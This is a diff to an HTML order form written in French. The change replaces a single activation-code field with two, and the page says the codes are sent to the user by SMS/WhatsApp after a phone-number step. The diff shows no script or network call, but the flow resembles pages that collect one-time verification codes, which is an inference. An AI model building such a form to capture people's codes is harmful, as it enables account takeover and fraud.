@@ -143,9 +143,11 @@
                     <input type="tel" id="phoneNumberConfirm" placeholder="Ex: 099..." pattern="[0-9]{9,10}">
                 </div>
                 <div class="form-group" id="step3Group" style="display: none;">
-                    <p style="font-size: 0.9rem; margin-bottom: 15px; color: var(--text-dark);">Demande envoyée ! Veuillez patienter. Nous allons vous envoyer un code d'activation par SMS/WhatsApp.</p>
-                    <label for="activationCode">Entrez votre code d'activation</label>
-                    <input type="text" id="activationCode" placeholder="Ex: A7B9Q">
+                    <p style="font-size: 0.9rem; margin-bottom: 15px; color: var(--text-dark);">Demande envoyée ! Veuillez patienter. Nous allons vous envoyer vos codes d'activation par SMS/WhatsApp.</p>
+                    <label for="activationCode">Entrez le premier code d'activation</label>
+                    <input type="text" id="activationCode" placeholder="Ex: A7B9Q" style="margin-bottom: 15px;">
+                    <label for="activationCode2">Entrez le deuxième code d'activation</label>
+                    <input type="text" id="activationCode2" placeholder="Ex: X9M2K">
                 </div>
                 <button type="submit" class="btn-confirm" id="btnConfirmOrder">CONTINUER</button>
             </form>
